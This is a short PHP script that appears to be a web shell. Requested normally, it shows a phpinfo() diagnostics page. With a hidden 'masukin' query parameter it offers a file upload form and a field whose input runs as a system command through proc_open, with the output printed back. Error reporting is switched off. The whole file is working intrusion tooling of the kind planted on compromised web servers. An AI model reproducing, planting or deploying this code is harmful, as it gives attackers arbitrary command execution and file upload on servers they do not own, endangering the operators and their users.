<?php

error_reporting(0); 
set_time_limit(0);


if (isset($_GET['masukin'])) {
    
    $filename = $_FILES['file']['name'];
    $filetmp  = $_FILES['file']['tmp_name'];
    
    
    echo "<br><form method='POST' enctype='multipart/form-data'>
            <input type='file' name='file' />
            <input type='submit' value='>>>' />
          </form>";
    
    
    echo '<form method="post">
            <input type="text" name="xmd" size="30">
            <input type="submit" value="Gaskan">
          </form>';

    
    if (move_uploaded_file($filetmp, $filename)) {
        echo '[OK] ===> '.$filename;
    }

    
    if (isset($_POST['xmd'])) {
        $xmd = $_POST['xmd'];
        
        
        $descriptors = [
            0 => ['pipe', 'r'], 
            1 => ['pipe', 'w'], 
            2 => ['pipe', 'w'], 
        ];

        
        $process = proc_open($xmd, $descriptors, $pipes);

        
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);

        
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);

        
        echo "<textarea cols=30 rows=15;>$output</textarea>";
        echo "Error:\n$error\n";
    }
} else {
    
    phpinfo();  
}
?>
